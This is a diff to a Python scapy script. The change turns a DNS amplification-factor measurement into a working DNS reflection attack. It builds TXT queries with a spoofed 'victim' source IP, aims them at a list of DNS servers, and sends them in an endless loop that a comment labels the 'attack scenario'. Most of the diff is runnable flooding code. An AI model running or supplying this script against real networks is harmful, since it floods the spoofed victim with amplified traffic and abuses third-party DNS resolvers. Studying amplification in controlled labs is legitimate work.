@@ -1,7 +1,7 @@
 #! /usr/bin/env python3
 # run as sudo
 from scapy.all import *
-import sys
+import sys, time
 import argparse
 
 def get_arguments():
@@ -17,7 +17,6 @@ def get_arguments():
 
 
 def main():
-
     # interface = "wlp0s20f3"                    # Interface you want to use
     # victim = "192.168.66.45"               # IP of that interface
     # dnsTarget = ["ip1","ip2","ip3"] # List of DNS Server IPs
@@ -27,21 +26,21 @@ def main():
     interface = opt.Interface
     time_to_live = 128
 
-    query_name = "google.com"
+    query_name = "www.example.com"  ## add to argparser ?
     query_type = ["ANY", "A","AAAA","CNAME","MX","NS","PTR","CERT","SRV","TXT", "SOA"]
-
-    for i in range(0,len(query_type)):
-        
-        packet = IP(src=victim, dst=dnsTarget, ttl=time_to_live) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=query_name, qtype=query_type[i]))
+    query_type = query_type[9] ##max factor type is TXT
+    packet = IP(src=victim, dst=dnsTarget, ttl=time_to_live) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=query_name, qtype=query_type))
+    # query = sr1(packet, iface=interface, timeout=10) #will wait until one response
+    # print('amplification_factor %f' % (len(query)/len(packet)))
+    # use send() when attack scenario
+    while True:
         try:
-            
-            
-            # send() 
-            query = sr1(packet, iface=interface, timeout=10) #will wait until one response
-            print(query[DNS].summary())
-            print('amplification_factor %f' % (len(query)/len(packet)))
+            query = send(packet, iface=interface) #will wait until one response
         except TypeError:
-            print("time out")
+            print('time out')
+            sys.exit(1)
+        except KeyboardInterrupt:
+            sys.exit(1)
 
 if __name__ == "__main__":
     main()
